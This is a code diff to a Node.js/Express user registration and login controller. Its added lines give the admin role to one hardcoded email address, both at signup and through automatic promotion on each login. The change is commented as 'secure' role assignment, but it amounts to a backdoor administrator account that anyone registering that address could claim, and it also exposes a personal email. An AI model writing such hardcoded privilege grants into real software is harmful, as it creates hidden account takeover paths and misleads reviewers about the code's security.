@@ -15,12 +15,24 @@ const saveUser = async (req, res) => {
             return res.status(400).json({ message: "Email is already registered" })
         }
 
+        // Secure admin role assignment
+        let assignedRole = role
+        if (assignedRole === 'admin') {
+            if (normalizedEmail === 'av478136@gmail.com') {
+                assignedRole = 'admin'
+            } else {
+                assignedRole = 'user'
+            }
+        } else if (normalizedEmail === 'av478136@gmail.com') {
+            assignedRole = 'admin'
+        }
+
         const hashpassword = await bcrypt.hash(password, 10)
         const newUser = new User({
             name,
             email: normalizedEmail,
             password: hashpassword,
-            role
+            role: assignedRole
         })
         await newUser.save()
         res.status(201).json({ message: "User saved successfully" })
@@ -34,7 +46,8 @@ const loginUser = async (req, res) => {
     const { email, password } = req.body
 
     try {
-        const user = await User.findOne({ email: email.toLowerCase() })
+        const normalizedEmail = email.toLowerCase().trim()
+        const user = await User.findOne({ email: normalizedEmail })
         if (!user) {
             return res.status(404).json({ message: "User not found" })
         }
@@ -42,6 +55,12 @@ const loginUser = async (req, res) => {
         const comparepassword = await bcrypt.compare(password, user.password)
         if (!comparepassword) {
             return res.status(401).json({ message: "Incorrect password" })
+        }
+
+        // Auto-promote developer email to admin if logged in
+        if (normalizedEmail === 'av478136@gmail.com' && user.role !== 'admin') {
+            user.role = 'admin'
+            await user.save()
         }
 
         const token = jwt.sign(
